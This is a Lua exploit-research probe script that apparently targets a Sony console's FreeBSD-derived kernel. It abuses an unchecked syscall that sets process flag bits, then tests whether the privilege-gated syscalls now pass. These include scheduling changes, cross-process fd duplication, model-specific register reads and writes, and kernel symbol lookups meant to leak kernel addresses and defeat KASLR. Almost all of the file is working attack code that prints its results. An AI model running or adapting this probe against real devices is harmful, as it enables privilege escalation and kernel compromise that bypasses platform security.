-- CRASH_CLASS: MODERATE
-- PROBE 115a: sys 643 flag OR → privilege bypass chain
--
-- Context: sys 643 ORs arbitrary bits into process+0xa34 with ZERO priv_check.
-- Probe 55a confirmed all 32 bits accepted (ret=0 for each).
-- BUT 55a only tested mprotect(RWX) and fork — both still blocked.
--
-- THE UNTESTED ANGLE: What about syscalls with DIFFERENT privilege checks?
-- - sys 559: priv_check(0x2ad) — scheduling class mutation
-- - sys 603: priv_check(0x2ab) — cross-process fd duplication
-- - sys 636: credential bit 62 — table write
-- - sys 646: credential bit 62 — metadata output
-- - kldstat(308)/kldsym(337): typically require kernel.securelevel check
-- - sys 625: AMD MSR WRMSR — no priv_check per analysis but returned -1
--
-- ALSO: sys 605 reportedly ORs bits into THE SAME proc+0xa34 field.
-- Does 605 reach a different code path than 643 for the same flag?
--
-- Section A: Set all flag bits, then test priv-gated syscalls
-- Section B: Test specific privilege bits (debug, system, jail flags)
-- Section C: sys 605 + sys 643 combined flag OR
-- Section D: After flag OR, test kldstat(308)/kldsym(337)
-- Section E: After flag OR, test sys 625 MSR write

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 115a: FLAG OR → PRIVILEGE BYPASS ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc643 = make_syscall(643)
local sc605 = make_syscall(605)
local sc559 = make_syscall(559)
local sc603 = make_syscall(603)
local sc636 = make_syscall(636)
local sc625 = make_syscall(625)
local sc308 = make_syscall(308)  -- kldstat
local sc337 = make_syscall(337)  -- kldsym
local sc20  = make_syscall(20)   -- getpid


-- ======================================================
-- SECTION A: Set all flags, test priv-gated syscalls
-- ======================================================
if TEST_SECTION == "A" then
    print("--- SECTION A: Full flag OR → privilege gate tests ---")
    print("")

    local pid = to_num(pcall(function() return sc20() end) and sc20() or 0)
    print("[A] PID: " .. pid)

    -- A1: Test priv-gated syscalls BEFORE flag OR (baseline)
    print("")
    print("[A1] BEFORE flag OR (baseline):")

    -- sys 559(0) — needs priv_check(0x2ad)
    local ok1, ret1 = pcall(function() return sc559(uint64(0)) end)
    local rv1 = ok1 and to_num(ret1) or -999
    print(string.format("  559(0): ret=%d%s", rv1, rv1 == 0 and " ALLOWED" or " blocked"))

    -- sys 559(1) — needs priv_check(0x2ad)
    local ok1b, ret1b = pcall(function() return sc559(uint64(1)) end)
    local rv1b = ok1b and to_num(ret1b) or -999
    print(string.format("  559(1): ret=%d%s", rv1b, rv1b == 0 and " ALLOWED" or " blocked"))

    -- sys 603(pid, pid) — needs priv_check(0x2ab)
    local ok2, ret2 = pcall(function() return sc603(uint64(pid), uint64(pid)) end)
    local rv2 = ok2 and to_num(ret2) or -999
    print(string.format("  603(%d,%d): ret=%d", pid, pid, rv2))

    -- sys 636(outbuf, 1) — needs credential bit 62
    local outbuf = memory.alloc(0x2000)
    local ok3, ret3 = pcall(function() return sc636(uint64(outbuf), uint64(1)) end)
    local rv3 = ok3 and to_num(ret3) or -999
    print(string.format("  636(outbuf,1): ret=%d", rv3))

    -- sys 625(0, 0, 0, 0) — AMD MSR controller
    local ok4, ret4 = pcall(function()
        return sc625(uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    local rv4 = ok4 and to_num(ret4) or -999
    print(string.format("  625(0,0,0,0): ret=%d", rv4))

    -- A2: Set ALL flag bits via sys 643
    print("")
    print("[A2] Setting all 32 flag bits via sys 643...")
    local flag_ok, flag_ret = pcall(function()
        return sc643(uint64(0xFFFFFFFF))
    end)
    print(string.format("  643(0xFFFFFFFF): ok=%s ret=%d",
        tostring(flag_ok), flag_ok and to_num(flag_ret) or -999))

    -- A3: Re-test the same priv-gated syscalls AFTER flag OR
    print("")
    print("[A3] AFTER flag OR (all bits set):")

    ok1, ret1 = pcall(function() return sc559(uint64(0)) end)
    rv1 = ok1 and to_num(ret1) or -999
    print(string.format("  559(0): ret=%d%s", rv1, rv1 == 0 and " *** ALLOWED AFTER FLAG ***" or " still blocked"))

    ok1b, ret1b = pcall(function() return sc559(uint64(1)) end)
    rv1b = ok1b and to_num(ret1b) or -999
    print(string.format("  559(1): ret=%d%s", rv1b, rv1b == 0 and " *** ALLOWED AFTER FLAG ***" or " still blocked"))

    ok2, ret2 = pcall(function() return sc603(uint64(pid), uint64(pid)) end)
    rv2 = ok2 and to_num(ret2) or -999
    print(string.format("  603(%d,%d): ret=%d%s", pid, pid, rv2, rv2 >= 0 and " *** CHANGED ***" or ""))

    ok3, ret3 = pcall(function() return sc636(uint64(outbuf), uint64(1)) end)
    rv3 = ok3 and to_num(ret3) or -999
    print(string.format("  636(outbuf,1): ret=%d%s", rv3, rv3 == 0 and " *** WRITE ALLOWED ***" or ""))

    ok4, ret4 = pcall(function()
        return sc625(uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    rv4 = ok4 and to_num(ret4) or -999
    print(string.format("  625(0,0,0,0): ret=%d%s", rv4, rv4 == 0 and " *** MSR ALLOWED ***" or ""))

    -- A4: Test additional flag-sensitive operations
    print("")
    print("[A4] Additional post-flag tests:")

    -- fork (known blocked)
    local sc2 = make_syscall(2)
    local okf, retf = pcall(function() return sc2() end)
    print(string.format("  fork: ok=%s ret=%d", tostring(okf), okf and to_num(retf) or -999))

    -- rfork
    local sc251 = make_syscall(251)
    local okrf, retrf = pcall(function() return sc251(uint64(0x1000)) end)
    print(string.format("  rfork(RFTHREAD): ok=%s ret=%d", tostring(okrf), okrf and to_num(retrf) or -999))

    -- mprotect RWX on a page
    local sc74 = make_syscall(74)
    local test_page = memory.alloc(0x4000)
    local okm, retm = pcall(function() return sc74(uint64(test_page), uint64(0x4000), uint64(7)) end)
    print(string.format("  mprotect(RWX): ok=%s ret=%d", tostring(okm), okm and to_num(retm) or -999))

    -- ioctl via make_syscall
    local sc54 = make_syscall(54)
    local oki, reti = pcall(function() return sc54(uint64(0), uint64(0x40087468), uint64(outbuf)) end)
    print(string.format("  ioctl(0,TIOCGWINSZ): ok=%s ret=%d", tostring(oki), oki and to_num(reti) or -999))


-- ======================================================
-- SECTION B: Test specific privilege bit patterns
-- ======================================================
elseif TEST_SECTION == "B" then
    print("--- SECTION B: Specific flag bits → priv gate tests ---")
    print("")

    -- FreeBSD process flag bits that might matter:
    -- P_SUGID, P_SYSTEM, P_TRACED, P_JAILED, P_INEXEC, etc.
    -- proc+0xa34 is Sony's p_flag2, separate from p_flag at +0x6c

    local test_bits = {
        {0x00000001, "bit0"},
        {0x00000002, "bit1"},
        {0x00000004, "bit2_debug?"},
        {0x00000008, "bit3"},
        {0x00000010, "bit4"},
        {0x00000020, "bit5"},
        {0x00000040, "bit6"},
        {0x00000080, "bit7"},
        {0x00000100, "bit8"},
        {0x00000200, "bit9"},
        {0x00000400, "bit10"},
        {0x00000800, "bit11"},
        {0x00001000, "bit12"},
        {0x00002000, "bit13"},
        {0x00004000, "bit14"},
        {0x00008000, "bit15"},
        {0x00010000, "bit16"},
        {0x00020000, "bit17"},
        {0x00040000, "bit18"},
        {0x00080000, "bit19_system?"},
        {0x00100000, "bit20"},
        {0x00200000, "bit21"},
        {0x00400000, "bit22"},
        {0x00800000, "bit23"},
        {0x01000000, "bit24"},
        {0x02000000, "bit25"},
        {0x04000000, "bit26"},
        {0x08000000, "bit27"},
        {0x10000000, "bit28"},
        {0x20000000, "bit29"},
        {0x40000000, "bit30"},
        {0x80000000, "bit31"},
    }

    -- Test each bit individually against sys 559(0) which needs priv_check(0x2ad)
    print("[B] Per-bit test: set single bit via 643, then try 559(0):")
    print("  (559 baseline before any flags...)")
    local ok_base, ret_base = pcall(function() return sc559(uint64(0)) end)
    local rv_base = ok_base and to_num(ret_base) or -999
    print(string.format("  559(0) baseline: ret=%d", rv_base))

    for _, bit_info in ipairs(test_bits) do
        -- Note: bits accumulate since we can only OR, never clear
        local ok_flag, ret_flag = pcall(function()
            return sc643(uint64(bit_info[1]))
        end)

        local ok_test, ret_test = pcall(function() return sc559(uint64(0)) end)
        local rv_test = ok_test and to_num(ret_test) or -999

        if rv_test ~= rv_base then
            print(string.format("  *** BIT 0x%08X [%s]: 559 ret CHANGED to %d ***",
                bit_info[1], bit_info[2], rv_test))
            rv_base = rv_test
        end
    end
    print("[B] Final 559(0) ret: " .. rv_base)
    if rv_base == 0 then
        print("*** PRIVILEGE BYPASS ACHIEVED VIA FLAG BITS ***")
    end


-- ======================================================
-- SECTION C: sys 605 + sys 643 combined
-- ======================================================
elseif TEST_SECTION == "C" then
    print("--- SECTION C: sys 605 + sys 643 combined flag OR ---")
    print("")

    -- Test if 605 and 643 affect different bits or the same field
    print("[C1] sys 643(0xAAAAAAAA) + sys 605(0x55555555) = full coverage?")

    local ok1, ret1 = pcall(function() return sc643(uint64(0xAAAAAAAA)) end)
    print(string.format("  643(0xAAAAAAAA): ok=%s ret=%d", tostring(ok1), ok1 and to_num(ret1) or -999))

    local ok2, ret2 = pcall(function() return sc605(uint64(0x55555555)) end)
    print(string.format("  605(0x55555555): ok=%s ret=%d", tostring(ok2), ok2 and to_num(ret2) or -999))

    -- Now test priv gates
    print("")
    print("[C2] Post-combined-OR privilege tests:")
    local ok_559, ret_559 = pcall(function() return sc559(uint64(0)) end)
    print(string.format("  559(0): ret=%d", ok_559 and to_num(ret_559) or -999))

    local ok_559b, ret_559b = pcall(function() return sc559(uint64(1)) end)
    print(string.format("  559(1): ret=%d", ok_559b and to_num(ret_559b) or -999))

    local pid = to_num(pcall(function() return sc20() end) and sc20() or 0)
    local ok_603, ret_603 = pcall(function()
        return sc603(uint64(pid), uint64(pid))
    end)
    print(string.format("  603(%d,%d): ret=%d", pid, pid, ok_603 and to_num(ret_603) or -999))

    -- Try sys 605 with struct arg after flag OR
    print("")
    print("[C3] sys 605 with struct after flag OR:")
    local buf = memory.alloc(0x100)
    for cmd = 0, 7 do
        for j = 0, 0xFC, 4 do safe_wd(buf + j, 0) end
        safe_wd(buf, cmd)
        local ok, ret = pcall(function() return sc605(uint64(buf)) end)
        local rv = ok and to_num(ret) or -999
        print(string.format("  605(ptr, cmd=%d): ret=%d", cmd, rv))
    end


-- ======================================================
-- SECTION D: After flag OR, test kldstat/kldsym
-- ======================================================
elseif TEST_SECTION == "D" then
    print("--- SECTION D: kldstat/kldsym after flag OR ---")
    print("")

    -- Set all flags first
    print("[D0] Setting all flag bits...")
    pcall(function() sc643(uint64(0xFFFFFFFF)) end)
    print("  Done")

    -- D1: kldstat(308)
    print("")
    print("[D1] kldstat(308) after flag OR:")
    local outbuf = memory.alloc(0x400)
    for j = 0, 0x3FC, 4 do safe_wd(outbuf + j, 0xDEADDEAD) end

    -- kldstat(fileid, stat_buf)
    -- Try with fileid=1 (kernel module 1)
    local ok1, ret1 = pcall(function()
        safe_wd(outbuf, 0x160)  -- stat_version = KLDSTAT_VER (or size)
        return sc308(uint64(1), uint64(outbuf))
    end)
    local rv1 = ok1 and to_num(ret1) or -999
    print(string.format("  kldstat(1, outbuf): ok=%s ret=%d", tostring(ok1), rv1))

    -- Check if output was modified
    local first_mod = nil
    for off = 4, 0x1FC, 4 do
        local v = safe_rd(outbuf + off)
        if v and v ~= 0xDEADDEAD then first_mod = off break end
    end
    if first_mod then
        print(string.format("  OUTPUT MODIFIED at +0x%X!", first_mod))
        print("  First 64 bytes:")
        for off = 0, 60, 4 do
            local v = safe_rd(outbuf + off)
            print(string.format("    +0x%02X: 0x%08X", off, v or 0))
        end

        -- Kernel pointer scan
        for off = 0, 0x1FC, 8 do
            local val = safe_rq(outbuf + off)
            if val then
                local vh, vl = get_hi_lo(val)
                if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                    print(string.format("  *** KPTR +0x%X: 0x%08X_%08X ***", off, vh, vl))
                end
            end
        end
    else
        print("  Output unchanged")
    end

    -- D2: kldsym(337)
    print("")
    print("[D2] kldsym(337) after flag OR:")
    local sym_buf = memory.alloc(0x200)
    -- struct kld_sym_lookup: version, symname, symvalue, symsize
    safe_wd(sym_buf, 1)       -- version
    safe_wd(sym_buf + 4, 0)

    -- Write "prison0" as symbol name in a separate buffer
    local name_buf = memory.alloc(0x40)
    local name = "prison0"
    for i = 1, #name do
        pcall(function() memory.write_byte(name_buf + i - 1, string.byte(name, i)) end)
    end
    pcall(function() memory.write_byte(name_buf + #name, 0) end)

    safe_wq(sym_buf + 8, name_buf)   -- symname pointer
    safe_wq(sym_buf + 16, 0)         -- symvalue (output)
    safe_wq(sym_buf + 24, 0)         -- symsize (output)

    -- kldsym(fileid=0, cmd=KLDSYM_LOOKUP=1, data=sym_buf)
    local ok2, ret2 = pcall(function()
        return sc337(uint64(0), uint64(1), uint64(sym_buf))
    end)
    local rv2 = ok2 and to_num(ret2) or -999
    print(string.format("  kldsym(0, LOOKUP, 'prison0'): ok=%s ret=%d", tostring(ok2), rv2))

    if rv2 == 0 then
        local sym_val = safe_rq(sym_buf + 16)
        if sym_val then
            local sh, sl = get_hi_lo(sym_val)
            print(string.format("  *** prison0 = 0x%08X_%08X ***", sh, sl))
            if sh >= 0xFFFF8000 then
                print("  *** KASLR DEFEATED — KERNEL ADDRESS LEAKED ***")
            end
        end
    end

    -- Try more symbols
    local symbols = {"allproc", "kernel_map", "copyin", "copyout"}
    for _, sym in ipairs(symbols) do
        for i = 1, #sym do
            pcall(function() memory.write_byte(name_buf + i - 1, string.byte(sym, i)) end)
        end
        pcall(function() memory.write_byte(name_buf + #sym, 0) end)

        safe_wq(sym_buf + 8, name_buf)
        safe_wq(sym_buf + 16, 0)
        safe_wq(sym_buf + 24, 0)

        local ok_s, ret_s = pcall(function()
            return sc337(uint64(0), uint64(1), uint64(sym_buf))
        end)
        local rv_s = ok_s and to_num(ret_s) or -999
        local sym_val = safe_rq(sym_buf + 16)
        local sym_h, sym_l = sym_val and get_hi_lo(sym_val) or 0, 0
        print(string.format("  kldsym(0, LOOKUP, '%s'): ret=%d val=0x%08X_%08X",
            sym, rv_s, sym_h, sym_l))
    end


-- ======================================================
-- SECTION E: After flag OR, test sys 625 MSR write
-- ======================================================
elseif TEST_SECTION == "E" then
    print("--- SECTION E: sys 625 MSR after flag OR ---")
    print("")

    -- Set all flags first
    pcall(function() sc643(uint64(0xFFFFFFFF)) end)
    print("[E0] All flag bits set")

    -- sys 625 has 22 sub-commands for AMD Zen2 PMU
    -- Previous tests (54a2) showed cmd=1 returns -1 for all PMC indices
    -- After flag OR, maybe the priv check passes?

    print("")
    print("[E1] sys 625 command sweep (0-10):")
    local outbuf = memory.alloc(0x200)
    for cmd = 0, 10 do
        for j = 0, 0x1FC, 4 do safe_wd(outbuf + j, 0xDEADDEAD) end

        local ok, ret = pcall(function()
            return sc625(uint64(cmd), uint64(0), uint64(outbuf), uint64(0x100))
        end)
        local rv = ok and to_num(ret) or -999

        local first_mod = nil
        for off = 0, 0x7C, 4 do
            local v = safe_rd(outbuf + off)
            if v and v ~= 0xDEADDEAD then first_mod = off break end
        end

        print(string.format("  625(cmd=%d, idx=0, outbuf, 0x100): ret=%d %s",
            cmd, rv, first_mod and string.format("MOD@+0x%X", first_mod) or "unchanged"))
    end

    -- E2: Try RDMSR (cmd=1) with specific MSR indices after flag OR
    print("")
    print("[E2] RDMSR (cmd=1) specific MSRs:")
    local msrs = {
        {0xC0010231, "PMC0"},
        {0xC0010230, "PMC_SEL0"},
        {0x00000010, "TSC"},
        {0x0000001B, "APIC_BASE"},
        {0xC0000080, "EFER"},
        {0xC0000082, "LSTAR"},
        {0xC0000100, "FS_BASE"},
        {0xC0000101, "GS_BASE"},
        {0xC0000102, "KERNEL_GS_BASE"},
    }
    for _, msr in ipairs(msrs) do
        for j = 0, 0x1FC, 4 do safe_wd(outbuf + j, 0) end

        local ok, ret = pcall(function()
            return sc625(uint64(1), uint64(msr[1]), uint64(outbuf), uint64(8))
        end)
        local rv = ok and to_num(ret) or -999

        local val = safe_rq(outbuf)
        local vh, vl = val and get_hi_lo(val) or 0, 0
        print(string.format("  RDMSR 0x%08X [%s]: ret=%d val=0x%08X_%08X",
            msr[1], msr[2], rv, vh, vl))

        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
            print("  *** KERNEL ADDRESS IN MSR ***")
        end
    end

    -- E3: Try WRMSR (cmd=2) — write to a safe counter
    print("")
    print("[E3] WRMSR (cmd=2) — attempt counter programming:")
    -- Try to enable PMC0 by writing event selector
    local ok_w, ret_w = pcall(function()
        return sc625(uint64(2), uint64(0xC0010230), uint64(0x76), uint64(0))
        -- 0x76 = retired instructions event, EN bit
    end)
    print(string.format("  WRMSR 0xC0010230 (PMC_SEL0=retired_insns): ret=%d",
        ok_w and to_num(ret_w) or -999))

    -- Now try RDMSR on the counter
    local ok_r, ret_r = pcall(function()
        return sc625(uint64(1), uint64(0xC0010231), uint64(outbuf), uint64(8))
    end)
    local ctr = safe_rq(outbuf)
    local ch, cl = ctr and get_hi_lo(ctr) or 0, 0
    print(string.format("  RDMSR 0xC0010231 (PMC0): ret=%d val=0x%08X_%08X",
        ok_r and to_num(ret_r) or -999, ch, cl))

else
    print("Unknown section: " .. TEST_SECTION)
end

print("")
print("=== PROBE 115a COMPLETE ===")
